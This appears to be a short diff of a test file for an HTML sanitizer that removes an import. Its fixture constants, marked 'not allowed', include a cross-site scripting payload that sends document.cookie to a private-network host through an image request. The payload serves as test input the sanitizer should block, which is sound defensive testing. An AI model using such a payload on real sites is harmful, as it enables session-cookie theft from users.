@@ -1,5 +1,5 @@
 import { isURLValid, sanitizeHTML } from './sanitizeHTML';
-import * as sanitize from 'sanitize-html';
+
 /** not allowed */
 const script = '<script src=""></script>';
 const script2 = `<script>new Image().src="http://192.168.149.128/bogus.php?output="+document.cookie;</script>`;
